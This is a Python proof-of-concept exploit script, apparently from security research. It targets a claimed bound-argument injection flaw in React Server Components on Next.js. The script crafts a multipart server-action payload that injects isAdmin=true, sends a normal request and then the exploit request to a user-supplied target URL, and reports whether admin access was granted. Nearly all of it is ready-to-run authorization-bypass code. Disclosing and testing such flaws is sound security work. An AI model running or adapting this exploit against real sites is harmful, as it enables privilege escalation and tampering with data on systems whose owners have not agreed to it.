#!/usr/bin/env python3
"""
RSC Bound Argument Injection Exploit
====================================

VULNERABILITY: React Server Components (RSC) allow attackers to inject
arbitrary bound arguments into server actions by modifying the FormData.

IMPACT: 
- Authorization bypass (inject isAdmin=true)
- Privilege escalation
- Data manipulation

TESTED ON: Next.js 16.1.0-canary.19 (dev mode)

USAGE:
    python3 rsc_bound_injection_exploit.py --target http://localhost:3001

AUTHOR: Security Research
DATE: 2024-12
"""

import requests
import argparse
import sys

def create_payload(boundary: str, is_admin: bool, message: str) -> str:
    """Create RSC multipart payload with controlled isAdmin argument."""
    body_boundary = "--" + boundary
    
    parts = []
    parts.append(body_boundary)
    parts.append('Content-Disposition: form-data; name="1_message"')
    parts.append('')
    parts.append(message)
    parts.append(body_boundary)
    parts.append('Content-Disposition: form-data; name="0"')
    parts.append('')
    # THE VULNERABILITY: We control this array!
    # First element becomes isAdmin, second is FormData reference
    parts.append(f'[{"true" if is_admin else "false"},"$K1"]')
    parts.append(body_boundary + '--')
    parts.append('')
    
    return '\r\n'.join(parts)


def exploit(target: str, action_id: str):
    """
    Exploit RSC bound argument injection vulnerability.
    
    The server action adminAction(isAdmin: boolean, data: FormData) expects
    isAdmin to be bound server-side, but we can inject it client-side!
    """
    boundary = "----WebKitFormBoundaryExploit12345"
    
    # URL-encoded router state tree
    router_state = "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%2C%22modal%22%3A%5B%22__DEFAULT__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
    
    headers = {
        "Accept": "text/x-component",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Origin": target,
        "Referer": f"{target}/",
        "next-action": action_id,
        "next-router-state-tree": router_state,
    }
    
    print("=" * 70)
    print("RSC Bound Argument Injection Exploit")
    print("=" * 70)
    print(f"Target: {target}")
    print(f"Action ID: {action_id}")
    
    # Test 1: Normal request (should fail)
    print("\n[*] TEST 1: Normal request (isAdmin=false)...")
    normal_payload = create_payload(boundary, is_admin=False, message="Normal request")
    
    try:
        resp = requests.post(target + "/", data=normal_payload.encode(), headers=headers, timeout=30)
        print(f"    Status: {resp.status_code}")
        
        if '"success":false' in resp.text:
            print("    Result: Access denied (expected)")
        else:
            print(f"    Response: {resp.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
        return False
    
    # Test 2: Exploit (inject isAdmin=true)
    print("\n[*] TEST 2: EXPLOIT - Injecting isAdmin=true...")
    exploit_payload = create_payload(boundary, is_admin=True, message="EXPLOITED!")
    
    try:
        resp = requests.post(target + "/", data=exploit_payload.encode(), headers=headers, timeout=30)
        print(f"    Status: {resp.status_code}")
        
        if '"success":true' in resp.text:
            print("\n" + "!" * 70)
            print("    [!!!] VULNERABILITY CONFIRMED - ADMIN ACCESS GRANTED!")
            print("!" * 70)
            print(f"\n    Response:\n    {resp.text}")
            return True
        else:
            print(f"    Response: {resp.text[:200]}")
            return False
    except Exception as e:
        print(f"    Error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="RSC Bound Argument Injection Exploit")
    parser.add_argument("--target", default="http://localhost:3001", help="Target URL")
    parser.add_argument("--action-id", default="60588fdb0c4065ce5d5ec505a43e3b8280939fdd35", 
                       help="Server Action ID (from next-action header)")
    args = parser.parse_args()
    
    success = exploit(args.target, args.action_id)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
